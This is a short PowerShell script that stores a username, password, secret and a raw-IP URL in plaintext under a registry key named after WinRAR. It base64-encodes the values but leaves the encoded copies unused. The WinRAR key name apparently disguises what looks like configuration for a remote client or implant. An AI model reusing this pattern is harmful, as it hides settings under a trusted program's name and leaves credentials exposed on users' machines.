$user = "client"
$pass = "client"
$secret = "client"
$url = "https://16.16.16.114:5000"
 
$encodedUser = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($user))
$encodedPass = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($pass))
$encodedSecret = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($secret))
$encodedUrl = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($url))
 
$keyPath = "HKCU:\Software\WinRAR\hclient"
 
New-Item -Path $keyPath -Force | Out-Null
 
Set-ItemProperty -Path $keyPath -Name "user" -Value $user
Set-ItemProperty -Path $keyPath -Name "password" -Value $pass
Set-ItemProperty -Path $keyPath -Name "secret" -Value $secret
Set-ItemProperty -Path $keyPath -Name "URL" -Value $url
